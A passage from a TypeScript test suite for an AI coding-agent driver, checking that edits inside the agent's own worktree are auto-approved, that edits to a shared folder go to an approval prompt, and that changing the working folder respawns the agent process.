      { type: 'http', name: 'remote', url: 'https://mcp.example/mcp', headers: [{ name: 'X-Key', value: 'k' }] }]);
    await driver.release(room.id, agent.id);
    assert.ok(children[0]!.stdinEnded || children[0]!.killed);
  } finally { await driver.dispose(); }
});
test('the process, session/new and Auto-edit\'s own-folder rule use the agent\'s folder from host.cwdFor; another folder respawns', async () => {
  let folder = join(tmpdir(), 'wt', 'roomaa-copilot');
  const edits: object[] = [];
  const { driver, agent, room, children, peers, host } = setup(peer => ({
    'session/prompt': async (params: any) => {
      for (const path of [join(folder, 'src', 'a.ts'), join(tmpdir(), 'shared.ts')])
        edits.push((await peer.rpc.request('session/request_permission', { sessionId: params.sessionId, toolCall: { toolCallId: path, kind: 'edit', title: 'Edit', locations: [{ path }] }, options: PERMISSION_OPTIONS })).outcome);
      return { stopReason: 'end_turn' };
    }
  }), { host: { cwdFor: () => folder }, agent: { options: { permission: 'auto-edit' } as any } });
  try {
    const sink = recordingSink(() => ({ decision: 'deny' }));
    await driver.turn(request(room, agent, sink));
    assert.equal(children[0]!.cwd, folder); assert.equal(method(peers[0]!, 'session/new')[0]!.params.cwd, folder);
    assert.deepEqual(edits, [{ outcome: 'selected', optionId: 'opt-allow' }, { outcome: 'selected', optionId: 'opt-deny' }], 'inside its worktree it edits freely; the shared folder asks');
    assert.equal(sink.approvals.length, 1);
    adopt(agent, sink);
    folder = host.cwd();
    await driver.turn(request(room, agent, recordingSink(() => ({ decision: 'allow' }))));
    assert.equal(children.length, 2); assert.equal(children[1]!.cwd, host.cwd());
    assert.equal(method(peers[1]!, 'session/load')[0]!.params.cwd, host.cwd());
  } finally { await driver.dispose(); }
});
